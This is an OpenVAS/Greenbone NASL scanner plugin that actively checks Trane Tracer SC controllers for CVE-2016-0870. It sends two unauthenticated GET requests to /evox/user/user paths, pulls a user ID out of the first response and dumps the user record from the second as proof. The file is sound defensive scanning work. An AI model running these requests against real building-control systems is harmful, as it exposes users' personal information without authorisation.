# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:trane:tracer_sc";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140281");
  script_version("2025-03-19T05:38:35+0000");
  script_tag(name:"last_modification", value:"2025-03-19 05:38:35 +0000 (Wed, 19 Mar 2025)");
  script_tag(name:"creation_date", value:"2017-08-08 08:52:34 +0700 (Tue, 08 Aug 2017)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2016-11-28 19:55:00 +0000 (Mon, 28 Nov 2016)");

  script_cve_id("CVE-2016-0870");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Trane Tracer SC <= 4.2.1134 Information Exposure Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_trane_tracer_sc_web_detect.nasl");
  script_mandatory_keys("trane_tracer/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Trane Tracer SC is prone to an information exposure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends two crafted HTTP GET requests and checks the
  responses.");

  script_tag(name:"insight", value:"The vulnerability allows an unauthorized party to obtain
  sensitive information from the contents of configuration files not protected by the web server.");

  script_tag(name:"affected", value:"Trane Tracer SC version 4.2.1134 and prior.");

  script_tag(name:"solution", value:"Contact the vendor for an update.");

  script_xref(name:"URL", value:"https://www.cisa.gov/news-events/ics-advisories/icsa-16-259-03");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

req = http_get(port: port, item: "/evox/user/user");
res = http_keepalive_send_recv(port: port, data: req);

id = eregmatch(pattern: '([0-9]+)/" is="trane:SC/user/user_', string: res);
if (!isnull(id[1])) {
  url = "/evox/user/user/" + id[1];
  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req);

  if ('name="lastName"' >< res && 'href="firstName/"' >< res) {
    report = "It was possible to extract user information at " +
             http_report_vuln_url(port: port, url: url, url_only: TRUE) + ":\n\nResult:\n\n" + res;

    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
